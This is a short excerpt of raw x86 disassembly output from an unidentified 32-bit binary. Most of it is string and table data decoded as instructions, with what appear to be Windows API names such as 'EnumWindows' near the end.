  423a0a:	dec    esi
  423a0b:	add    BYTE PTR [edi+0x0],cl
  423a0e:	pop    edx
  423a0f:	add    BYTE PTR [edi+0x0],bl
  423a12:	add    BYTE PTR ss:[ecx+0x0],bl
  423a16:	dec    ebp
  423a17:	add    BYTE PTR [esi],dh
  423a19:	add    BYTE PTR [ebx],dh
  423a1b:	add    BYTE PTR [edi+0x0],bl
  423a1e:	xor    al,0x0
  423a20:	dec    esi
  423a21:	add    BYTE PTR [edx],dh
  423a23:	add    BYTE PTR [esi],dh
  423a25:	add    BYTE PTR [ecx],dh
  423a27:	add    BYTE PTR [eax],al
  423a29:	add    BYTE PTR [ebx+0x0],cl
  423a2c:	dec    eax
  423a2d:	add    BYTE PTR [eax],bh
  423a2f:	add    BYTE PTR [edi+0x0],bl
  423a32:	inc    esi
  423a33:	add    BYTE PTR [esi+0x0],al
  423a36:	push   esp
  423a37:	add    BYTE PTR [edi],dh
  423a39:	add    BYTE PTR [esi],dh
  423a3b:	add    BYTE PTR [edi+0x0],bl
  423a3e:	dec    esp
  423a3f:	add    BYTE PTR [ecx+0x0],bl
  423a42:	add    BYTE PTR [eax],al
  423a44:	push   ebx
  423a45:	add    BYTE PTR [ecx+0x0],bl
  423a48:	xor    BYTE PTR [eax],al
  423a4a:	pop    edi
  423a4b:	add    BYTE PTR [ecx],bh
  423a4d:	add    BYTE PTR [edx+0x0],dl
  423a50:	dec    eax
  423a51:	add    BYTE PTR [ecx+0x0],bl
  423a54:	xor    al,BYTE PTR [eax]
  423a56:	pop    edi
  423a57:	add    BYTE PTR [eax],dh
  423a59:	add    BYTE PTR [eax],al
  423a5b:	add    BYTE PTR [edx+0x0],al
  423a5e:	dec    edx
  423a5f:	add    BYTE PTR [esi+0x0],cl
  423a62:	xor    al,BYTE PTR [eax]
  423a64:	pop    edi
  423a65:	add    BYTE PTR [eax+eax*1+0x33],cl
  423a69:	add    BYTE PTR [edx+0x0],dl
  423a6c:	xor    al,0x0
  423a6e:	dec    eax
  423a6f:	add    BYTE PTR [eax],al
  423a71:	add    BYTE PTR [ebp+0x0],dl
  423a74:	add    BYTE PTR ss:[ebp+0x0],cl
  423a78:	xor    DWORD PTR [eax],eax
  423a7a:	pop    edi
  423a7b:	add    BYTE PTR [esi],dh
  423a7d:	add    BYTE PTR [ecx+0x0],bl
  423a80:	push   ebp
  423a81:	add    BYTE PTR [eax+eax*1+0x5f],dl
  423a85:	add    BYTE PTR [edi+0x0],cl
  423a88:	inc    esp
  423a89:	add    BYTE PTR [edi+0x0],dl
  423a8c:	push   ebx
  423a8d:	add    BYTE PTR [eax],al
  423a8f:	add    BYTE PTR [edx+0x0],bl
  423a92:	inc    ebx
  423a93:	add    BYTE PTR [ebp+0x0],dl
  423a96:	pop    edi
  423a97:	add    BYTE PTR [ecx],dh
  423a99:	add    BYTE PTR [ebp+0x0],al
  423a9c:	push   esp
  423a9d:	add    BYTE PTR [eax],dh
  423a9f:	add    BYTE PTR [eax],al
  423aa1:	add    BYTE PTR [eax],al
  423aa3:	add    BYTE PTR [eax],al
  423aa5:	add    BYTE PTR [eax-0x7ffbffbe],al
  423aab:	inc    edx
  423aac:	add    BYTE PTR [eax],cl
  423aae:	add    BYTE PTR [edx+0x0],0xc
  423ab2:	add    BYTE PTR [edx+0x0],0x10
  423ab6:	add    BYTE PTR [edx+0x0],0x14
  423aba:	add    BYTE PTR [edx+0x0],0x18
  423abe:	add    BYTE PTR [edx+0x0],0x1c
  423ac2:	add    BYTE PTR [edx+0x0],0x20
  423ac6:	add    BYTE PTR [edx+0x0],0x24
  423aca:	add    BYTE PTR [edx+0x0],0x28
  423ace:	add    BYTE PTR [edx+0x0],0x0
	...
  423ae2:	add    BYTE PTR [eax],al
  423ae4:	sbb    edi,DWORD PTR [edi+0x4d57]
  423aea:	add    BYTE PTR [eax],al
  423aec:	adc    bh,BYTE PTR [ebx]
  423aee:	add    al,BYTE PTR [eax]
  423af0:	add    DWORD PTR [eax],eax
  423af2:	add    BYTE PTR [eax],al
  423af4:	add    DWORD PTR [eax],eax
  423af6:	add    BYTE PTR [eax],al
  423af8:	add    DWORD PTR [eax],eax
  423afa:	add    BYTE PTR [eax],al
  423afc:	or     BYTE PTR [ebx],bh
  423afe:	add    al,BYTE PTR [eax]
  423b00:	or     al,0x3b
  423b02:	add    al,BYTE PTR [eax]
  423b04:	adc    BYTE PTR [ebx],bh
  423b06:	add    al,BYTE PTR [eax]
  423b08:	inc    esi
  423b09:	iret   
  423b0a:	add    BYTE PTR [eax],al
  423b0c:	push   ds
  423b0d:	cmp    eax,DWORD PTR [edx]
  423b0f:	add    BYTE PTR [eax],al
  423b11:	add    BYTE PTR [edi+0x6f],dl
  423b14:	jb     0x423b7a
  423b16:	push   edi
  423b17:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  423b1e:	aas    
  423b1f:	inc    ebp
  423b20:	outs   dx,BYTE PTR ds:[esi]
  423b21:	jne    0x423b90
  423b23:	push   edi
  423b24:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  423b2b:	popa   
  423b2c:	je     0x423b97
  423b2e:	outs   dx,DWORD PTR ds:[esi]
  423b2f:	outs   dx,BYTE PTR ds:[esi]
  423b30:	jae    0x423b85
  423b32:	je     0x423b95
  423b34:	.byte 0x74
